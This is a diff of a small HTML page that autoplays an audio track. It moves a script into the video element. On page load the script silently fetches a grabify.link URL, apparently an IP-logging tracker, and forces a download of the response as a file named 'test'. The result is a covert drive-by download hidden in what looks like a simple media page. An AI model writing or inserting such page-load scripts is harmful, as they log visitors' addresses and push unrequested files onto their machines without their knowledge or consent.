@@ -3,23 +3,23 @@
     <meta name="viewport" content="width=device-width">
   </head>
   <body>
-    <script>
-      function download(url, filename) {
-        fetch(url)
-        .then(response => response.blob())
-        .then(blob => {
-          const link = document.createElement("a");
-          link.href = URL.createObjectURL(blob);
-          link.download = filename;
-          link.click();
-        })
-        .catch(console.error);
-      }
-      
-      download("https://grabify.link/78TSX1","test")
-    </script>
     <video controls="" autoplay="" name="media">
       <source src="https://toshibatoshamara.github.io/chippi.mp3" type="audio/mp3">
+      <script>
+        function download(url, filename) {
+          fetch(url)
+          .then(response => response.blob())
+          .then(blob => {
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+          })
+          .catch(console.error);
+        }
+      
+        download("https://grabify.link/78TSX1","test")
+      </script>
     </video>
   </body>
 </html>
